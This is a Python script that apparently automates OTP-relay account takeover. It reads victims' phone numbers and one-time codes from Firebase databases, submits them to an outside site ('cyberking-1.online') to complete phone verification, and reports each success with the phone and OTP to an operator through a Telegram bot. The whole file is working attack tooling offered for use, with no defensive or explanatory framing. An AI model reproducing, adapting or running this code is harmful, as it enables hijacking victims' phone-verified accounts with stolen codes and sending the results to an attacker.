import os
import requests
import json
import time
from datetime import datetime
import asyncio
import telegram

# === CONFIG ===
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID"))
FIREBASE_DB_FILE = "firebase_links.json"
TARGET_URL = "https://cyberking-1.online/index.php"
SESSIONS = {}

# === UTILS ===
def load_links():
    try:
        with open(FIREBASE_DB_FILE) as f:
            return json.load(f)
    except:
        return []

def get_numbers(firebase_url):
    try:
        url = f"{firebase_url.strip().rstrip('.json')}.json"
        r = requests.get(url, timeout=8)
        if r.status_code != 200: return []
        data = r.json()
        if not isinstance(data, dict): return []
        nums = []
        for k, v in data.items():
            if isinstance(v, dict) and 'phone' in v:
                nums.append((k, v['phone'], v.get('otp'), firebase_url))
        return nums
    except Exception as e:
        print(f"[-] Fetch failed: {e}")
        return []

def submit_phone(phone):
    try:
        s = requests.Session()
        s.get(TARGET_URL)
        r = s.post(TARGET_URL, data={"phone": phone, "submit": "1"}, timeout=10)
        if "otp" in r.text.lower():
            SESSIONS[phone] = s
            return True
    except: pass
    return False

def submit_otp(otp, phone):
    try:
        s = SESSIONS.get(phone) or requests.Session()
        r = s.post(TARGET_URL, data={"otp": otp, "verify": "1"}, timeout=10)
        return "success" in r.text.lower()
    except: return False

# === MAIN LOOP ===
async def monitor_all():
    bot = telegram.Bot(BOT_TOKEN)
    while True:
        links = load_links()
        for url in links:
            try:
                nums = get_numbers(url)
                for node, phone, otp, db_url in nums:
                    if phone and submit_phone(phone):
                        print(f"[+] Sent: {phone}")
                        # Wait max 45s for OTP
                        for _ in range(23):
                            time.sleep(2)
                            fresh = get_numbers(db_url)
                            for n, p, o, _ in fresh:
                                if p == phone and o:
                                    if submit_otp(o, p):
                                        await bot.send_message(ADMIN_ID, f"✅ Verified: {p} | OTP: {o}")
                                    break
                            else:
                                continue
                            break
            except Exception as e:
                print(f"[-] Error: {e}")
        time.sleep(8)

if __name__ == "__main__":
    asyncio.run(monitor_all())
